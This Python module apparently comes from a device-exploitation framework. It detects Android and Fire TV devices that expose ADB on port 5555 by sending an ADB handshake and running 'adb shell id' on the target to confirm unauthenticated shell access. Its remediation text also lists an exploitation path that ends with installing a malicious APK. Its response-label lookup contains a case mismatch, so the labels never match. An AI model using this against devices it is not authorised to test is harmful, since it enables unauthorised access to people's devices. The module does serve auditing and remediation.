# Author: André Henrique (LinkedIn/X: @mrhenrike)
"""Android TV — Open ADB Access Credential Documentation.

Documents and detects Android/Fire TV devices that expose ADB over TCP
on port 5555 without authentication.  Attempts ``adb connect`` and checks
whether the device presents an ``unauthorized`` message or grants shell
access directly.

CVE: N/A (open ADB is a misconfiguration)
CVSS: N/A
Version: 1.0.0
"""

import socket
import struct
import subprocess
from typing import Optional

from embedxpl.core.exploit import *
from embedxpl.core.exploit.exploit import BaseExploit

_CNXN_CMD    = 0x4E584E43
_CNXN_MAGIC  = _CNXN_CMD ^ 0xFFFFFFFF
_ADB_VER     = 0x01000001
_MAX_PAYLOAD = 256 * 1024

_GUIDANCE = """
Open ADB TCP Access — Remediation Guidance
===========================================
DEVICE ACCESS PATTERNS DETECTED:
  • Port 5555 accepts TCP connections with no TLS.
  • ADB CNXN exchange succeeds without RSA key pairing.
  • 'adb connect' may grant immediate shell access.

EXPLOITATION PATH (for documentation only):
  1. adb connect <device-ip>:5555
  2. adb -s <device-ip>:5555 shell id
  3. adb -s <device-ip>:5555 shell pm list packages
  4. adb -s <device-ip>:5555 install -r <malicious.apk>

REMEDIATION:
  • Disable "Developer options > ADB over network" when not in use.
  • Restrict TCP port 5555 at the network/firewall layer.
  • Update firmware — newer Android TV versions require RSA pairing.
"""


def _crc32(data: bytes) -> int:
    """Compute ADB-style CRC (byte-sum mod 2^32).

    Args:
        data: Bytes to checksum.

    Returns:
        32-bit checksum.
    """
    return sum(data) & 0xFFFFFFFF


def _build_cnxn(banner: str = "host::") -> bytes:
    """Build a raw ADB CNXN packet.

    Args:
        banner: Identity string for the connection payload.

    Returns:
        24-byte header followed by the banner bytes.
    """
    payload = banner.encode()
    header  = struct.pack(
        "<IIIIII",
        _CNXN_CMD, _ADB_VER, _MAX_PAYLOAD,
        len(payload), _crc32(payload), _CNXN_MAGIC,
    )
    return header + payload


class Exploit(BaseExploit):
    """Android TV — Open ADB Access Pattern Detector.

    Attempts three escalating checks to characterise the ADB exposure:
    1. Raw TCP connect to port 5555.
    2. ADB CNXN banner probe to detect protocol response.
    3. ``adb connect`` + ``adb shell id`` via subprocess to determine
       whether the device grants immediate shell access or shows
       ``unauthorized``.

    Prints detailed guidance on the exposure and remediation steps.

    Author: André Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Android TV — Open ADB Default Access Patterns",
        "description": (
            "Detects Android TV and Fire TV devices with ADB over TCP enabled "
            "on port 5555 and characterises the access level: unauthenticated "
            "shell, auth-required, or closed. Prints remediation guidance."
        ),
        "authors": (
            "Android Open Source Project",
            "André Henrique (@mrhenrike) — EmbedXPL-Forge",
        ),
        "references": (
            "https://developer.android.com/studio/command-line/adb",
            "https://www.kb.cert.org/vuls/id/760769",
            "https://nvd.nist.gov/vuln/detail/CVE-2020-0034",
        ),
        "devices": ("Android TV", "Fire TV"),
    }

    target  = OptIP("", "Target IPv4 address")
    port    = OptPort(5555, "ADB TCP port (default 5555)")
    timeout = OptInteger(5, "Socket and subprocess timeout in seconds")

    # ------------------------------------------------------------------
    # Internal helpers
    # ------------------------------------------------------------------

    def _tcp_open(self) -> bool:
        """Check if the ADB TCP port is open.

        Returns:
            True if a TCP connection succeeds, False otherwise.
        """
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)), timeout=float(self.timeout)
            )
            sock.close()
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def _cnxn_responds(self) -> Optional[str]:
        """Send an ADB CNXN probe and return the first 4 bytes of the response.

        Returns:
            Hex of the first 4 response bytes, or None if no response.
        """
        try:
            sock = socket.create_connection(
                (str(self.target), int(self.port)), timeout=float(self.timeout)
            )
            sock.sendall(_build_cnxn())
            data = sock.recv(24)
            sock.close()
            return data[:4].hex() if len(data) >= 4 else None
        except (socket.timeout, ConnectionRefusedError, OSError):
            return None

    def _adb_cli_check(self) -> str:
        """Run ``adb connect`` + ``adb shell id`` via subprocess.

        Returns:
            A status string: ``"shell_access"``, ``"unauthorized"``,
            ``"connect_failed"``, or ``"adb_not_found"``.
        """
        endpoint = "{}:{}".format(self.target, self.port)
        try:
            result = subprocess.run(
                ["adb", "connect", endpoint],
                capture_output=True, text=True, timeout=self.timeout,
            )
            conn_out = (result.stdout + result.stderr).lower()
            if "connected" not in conn_out and "already connected" not in conn_out:
                return "connect_failed"

            shell_result = subprocess.run(
                ["adb", "-s", endpoint, "shell", "id"],
                capture_output=True, text=True, timeout=self.timeout,
            )
            shell_out = (shell_result.stdout + shell_result.stderr).lower()
            if "uid=" in shell_out:
                return "shell_access"
            if "unauthorized" in shell_out:
                return "unauthorized"
            return "connect_failed"
        except FileNotFoundError:
            return "adb_not_found"
        except subprocess.TimeoutExpired:
            return "connect_failed"

    # ------------------------------------------------------------------
    # Public interface
    # ------------------------------------------------------------------

    def run(self) -> None:
        """Characterise open ADB access on the target and print guidance.

        Runs TCP, CNXN, and ADB CLI checks to determine the level of
        exposure, then prints contextual remediation guidance.
        """
        print_status("Checking ADB access patterns on {}:{}...".format(self.target, self.port))

        if not self._tcp_open():
            print_error("Port {} is closed — ADB not reachable.".format(self.port))
            return
        print_success("Port {} is OPEN".format(self.port))

        resp_hex = self._cnxn_responds()
        if resp_hex:
            known = {"434e584e": "CNXN", "41555448": "AUTH", "4f50454e": "OPEN"}
            label = known.get(resp_hex.upper(), "UNKNOWN ({})".format(resp_hex))
            print_success("ADB CNXN probe response: {} — ADB daemon is running".format(label))
        else:
            print_warning("Port open but no ADB response to CNXN probe.")

        cli_status = self._adb_cli_check()
        if cli_status == "shell_access":
            print_success("CRITICAL: Unauthenticated ADB shell access confirmed!")
        elif cli_status == "unauthorized":
            print_warning("ADB connected but device requires RSA key authorization.")
        elif cli_status == "connect_failed":
            print_error("adb CLI could not establish a usable connection.")
        elif cli_status == "adb_not_found":
            print_warning("'adb' binary not found on PATH — CLI check skipped.")

        print_status(_GUIDANCE)

    @mute
    def check(self) -> bool:
        """Check if the ADB port is open and responds to CNXN.

        Returns:
            True if port is open and ADB CNXN yields a response.
        """
        if not self._tcp_open():
            return False
        return self._cnxn_responds() is not None
